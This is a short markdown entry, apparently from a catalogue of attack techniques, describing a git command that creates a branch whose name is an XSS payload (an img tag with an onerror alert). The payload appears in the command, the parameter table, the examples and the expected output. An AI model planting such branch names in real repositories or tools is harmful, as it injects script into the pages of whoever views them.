---
data: git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
tags:
  - git
  - branch
  - xss
type: command
output: Switched to new branch
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.345Z'
id: ac87ca86-fd69-428e-808e-1a1d2e2461e9
verified: false
validated: true
submitted: true
---
# git-checkout-xss-branch

## Command

```bash
git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
```

## Description

Creates and switches to a new branch with the XSS payload in its name, key to the injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b` | Create new branch flag | Yes |
| `"<img/src='x'/onerror=alert(document.domain)>"` | Branch name containing XSS payload | Yes |

## Examples

### Basic Usage

```bash
git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
```

### Advanced Usage

From specific commit:

```bash
git checkout -b malicious-branch abc1234
```

## Expected Output

'Switched to a new branch "<img/src='x'/onerror=alert(document.domain)>"'.

## Related

- [[Related Procedure|procedures/Create-Malicious-Branch-with-XSS-Payload]]
